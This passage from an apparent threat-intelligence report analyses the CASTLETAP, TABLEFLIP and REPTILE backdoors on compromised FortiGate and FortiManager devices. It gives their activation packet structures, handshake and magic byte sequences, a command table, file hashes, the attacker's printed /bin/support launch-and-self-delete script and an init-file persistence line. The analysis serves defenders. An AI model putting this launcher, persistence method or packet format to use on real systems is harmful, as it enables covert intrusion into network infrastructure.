style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\u003ctable border\u003d\"1\" style\u003d\"border-collapse:collapse;width:100%\"\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"width:29.0107%\"\u003e\n\u003cp\u003e\u003cstrong\u003eByte Index/Range\u003c/strong\u003e\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"width:70.9893%\"\u003e\n\u003cp\u003e\u003cstrong\u003ePayload Section Description\u003c/strong\u003e\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"width:29.0107%\"\u003e\n\u003cp\u003e\u003ccode\u003e\u0026lt;0x00-0x01\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"width:70.9893%\"\u003e\n\u003cp\u003e\u003ccode\u003e\u0026lt;flag indicating whether to create clone or not\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"width:29.0107%\"\u003e\n\u003cp\u003e\u003ccode\u003e\u0026lt;0x01-0x02\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"width:70.9893%\"\u003e\n\u003cp\u003e\u003ccode\u003e\u0026lt;unused\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"width:29.0107%\"\u003e\n\u003cp\u003e\u003ccode\u003e\u0026lt;0x02-0x0c\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"width:70.9893%\"\u003e\n\u003cp\u003e\u003ccode\u003e\u0026lt;9-byte magic string + null byte\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"width:29.0107%\"\u003e\n\u003cp\u003e\u003ccode\u003e\u0026lt;0x0c-0x10\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"width:70.9893%\"\u003e\n\u003cp\u003e\u003ccode\u003e\u0026lt;XOR encoded C2 IP\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"width:29.0107%\"\u003e\n\u003cp\u003e\u003ccode\u003e\u0026lt;0x10-0x15\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\u003c/td\u003e\n\u003ctd style\u003d\"width:70.9893%\"\u003e\n\u003cp\u003e\u003ccode\u003e\u0026lt;XOR encoded port\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003cbr\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center\"\u003eTable 3: CASTLETAP ICMP packet structure\u003c/div\u003e\n\u003c/div\u003e\n\u003cp\u003eWhen the C2 IP address and port was parsed from the activation packet, CASTLETAP initiated a connection to the C2 over an SSL socket. Once this connection was established, CASTLETAP expected the C2 server to initiate a handshake with the 16-byte sequence seen in Figure 13, echoing the same sequence in response.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e0x58, 0x90, 0xAE, 0x86, 0xF1, 0xB9, 0x1C, 0xF6, 0x29, 0x83, 0x95, 0x71, 0x1D, 0xDE, 0x58, 0x0D\u003c/code\u003e\u003c/pre\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center\"\u003eFigure 13: CASTLETAP handshake sequence\u003c/div\u003e\n\u003c/div\u003e\n\u003cp\u003eOnce connected to the C2, CASTLETAP could accept multiple types of commands over SSL, as seen in Table 4.\u003c/p\u003e\n\u003cbr\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\u003ctable\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\u003cstrong\u003eCommand\u003c/strong\u003e\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\u003cstrong\u003eDescription\u003c/strong\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e0x1\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003eUpload file (to victim)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e0x2\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003eDownload file (from victim)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e0x3\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003eSpawn \u003cem\u003ebusybox\u003c/em\u003e based command shell, otherwise fallback to a normal command shell.\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e0x4\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003eContinue receiving\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e0x5\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003eReceive complete\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003cdiv style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center\"\u003eTable 4: CASTLETAP command key\u003c/div\u003e\n\u003c/div\u003e\n\u003cp\u003eWhen a command was successfully received, the backdoor returned the sequence \u003cem\u003e‘;7(Zu9YTsA7qQ#vw’\u003c/em\u003e as an acknowledgement token; this same string was also sent to signal session termination.\u003c/p\u003e\n\u003cp\u003eOnce CASTLETAP was deployed to the FortiGate firewalls, the threat actor connected to ESXi and vCenter machines. The threat actor deployed VIRTUALPITA and VIRTUALPIE to establish persistence, allowing for continued access to the hypervisors and the guest machines. This is described in further detail in the blog post, “\u003ca href\u003d\"https://cloud.google.com/blog/topics/threat-intelligence/esxi-hypervisors-malware-persistence\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003eBad VIB(E)s Part One: Investigating Novel Malware Persistence Within ESXi Hypervisors\u003c/a\u003e.”\u003c/p\u003e\n\u003ch2\u003eScenario #2 (Detailed): FortiManager Not Exposed to the Internet\u003c/h2\u003e\n\u003cp\u003eThe technical details that follow describe the attack path taken by the threat actor where the FortiManager had network Access Control Lists (ACL) set up to restrict external access.\u003c/p\u003e\n\u003ch3\u003eRegaining Access to the Internet-restricted FortiManager\u003c/h3\u003e\n\u003cp\u003eWhen ACLs were implemented on the FortiManager device, the threat actor lost direct public access to device. To regain access to the FortiManager, the threat actor pivoted from a FortiGate Firewall compromised with CASTLETAP. The threat actor then deployed the following three (3) malicious files, seen in Table 5, to the FortiManager upon successful reconnection.\u003c/p\u003e\n\u003cbr\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\u003ctable\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\u003cstrong\u003eMalware Family\u003c/strong\u003e\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\u003cstrong\u003eFile Path\u003c/strong\u003e\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\u003cstrong\u003eDescription\u003c/strong\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\u003ccode\u003eN/A\u003c/code\u003e\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\u003ccode\u003e/bin/support\u003c/code\u003e\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\u003ccode\u003eLaunches /bin/auth and /bin/klogd and deletes the two files along with /bin/support from disk.\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\u003ca href\u003d\"https://advantage.mandiant.com/malware/malware--77f7a062-37ab-575e-8ac6-ee720d81f60f\" rel\u003d\"noopener\" target\u003d\"_blank\"\u003e\u003ccode\u003eTABLEFLIP\u003c/code\u003e\u003c/a\u003e\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\u003ccode\u003e/bin/auth\u003c/code\u003e\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\u003ccode\u003eA passive utility to setup network traffic redirection from a specific IP address destined to the FortiManager on TCP port 541 to another specified port.\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\u003ccode\u003eREPTILE\u003c/code\u003e\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\u003ccode\u003e/bin/klogd\u003c/code\u003e\u003c/td\u003e\n\u003ctd style\u003d\"border:1px solid #000000;padding:16px\"\u003e\u003ccode\u003eA backdoor utility that listens for a specialized packet for activation.\u003c/code\u003e\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003c/div\u003e\n\u003cdiv style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center\"\u003eTable 5: Attack Lifecycle 2 Malware Key\u003c/div\u003e\n\u003c/div\u003e\n\u003cp\u003eThe file \u003ccode\u003e/bin/support\u003c/code\u003e (MD5: \u003ccode\u003e9ce2459168cf4b5af494776a70e0feda\u003c/code\u003e) served as a launch script to execute \u003ccode\u003e/bin/klogd\u003c/code\u003e (REPTILE variant) and \u003ccode\u003e/bin/auth\u003c/code\u003e (TABLEFLIP). The attacker modified the startup file \u003ccode\u003e/etc/init.d/localnet\u003c/code\u003e to execute the line ‘\u003ccode\u003enohup /bin/support \u0026amp;\u003c/code\u003e’ so the script would run every time the system was rebooted. Since the running FortiOS file system was an ephemeral copy of the archive \u003ccode\u003erootfs.gz\u003c/code\u003e, the files would be deleted from the ephemeral copy after being loaded into memory and persist in the \u003ccode\u003erootfs.gz\u003c/code\u003e archive, a file not accessible to users without pulling a forensic image. The contents of \u003ccode\u003e/bin/support\u003c/code\u003e can be seen in Figure 14.\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e#!/bin/bash\r\n\r\n#cp /bin/sh /bin/top\r\n\r\nsleep 30\r\n/bin/klogd\r\n/bin/auth\r\nrm -rf /bin/klogd\r\nrm -rf /nohup.out\r\nrm -rf /bin/support\u003c/code\u003e\u003c/pre\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center\"\u003eFigure 14: Contents of /bin/support\u003c/div\u003e\n\u003c/div\u003e\n\u003ch3\u003eTABLEFLIP (Traffic Redirection Utility)\u003c/h3\u003e\n\u003cp\u003eTo enable continued access directly from the Internet, the threat actor implemented TABLEFLIP (MD5: \u003ccode\u003eb6e92149efaf78e9ce7552297505b9d5\u003c/code\u003e), a passive traffic redirection utility that listens on all active interfaces for specialized command packets. With this utility in place, and regardless of the ACL’s in place, the threat actor would be able to connect directly to the FortiManager as seen in Figure 15.\u003c/p\u003e\n\u003c/div\u003e"]]],[null,null,null,null,null,null,null,null,[[[null,"\u003cp\u003eFigure 15: TABLEFLIP behavior\u003c/p\u003e"],["https://storage.googleapis.com/gweb-cloudblog-publish/images/fig15-tableflip-behavior_evvo.max-2200x2200.png","https://storage.googleapis.com/gweb-cloudblog-publish/images/fig15-tableflip-behavior_evvo.max-1100x1100.png 1060w, https://storage.googleapis.com/gweb-cloudblog-publish/images/fig15-tableflip-behavior_evvo.max-2200x2200.png 2120w"," 1060px,  2120px","https://storage.googleapis.com/gweb-cloudblog-publish/images/fig15-tableflip-behavior_evvo.max-2200x2200.png"],null,3]]],[null,null,[null,[null,"\u003cp\u003eTABLEFLIP was configured to listen on all active interfaces for TCP packets and searches at the start of the TCP payload for the following magic packet, shown in Figure 16, for packets destined for port TCP 541.\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e17 03 01 01 D8 54 2F 31\u003c/code\u003e\u003c/pre\u003e\n\u003cdiv style\u003d\"color:#5f6368;display:block;font-size:16px;font-style:italic;margin-top:8px;width:100%;text-align:center\"\u003eFigure 16: TABLEFLIP magic number sequence\u003c/div\u003e\n\u003cp\u003eIf the magic number was found, the malware extracted a XOR key from offset 0xB of the TCP payload. This key was used as a seed for XOR based sequential decryption. TCP payload offset 0xC onwards was decrypted using this scheme. Figure 17 shows the structure of the payload.\u003c/p\u003e\n\u003cp\u003e \u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003estruct _payload\r\n{\r\n_DWORD magic_dword1;\r\n_DWORD magic_dword2;\r\n_BYTE unused[3];\r\n_BYTE xor_key;\r\n_DWORD command;\r\n_DWORD ip;\r\n_WORD port;\r\n};\u003c/code\u003e\u003c/pre\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv 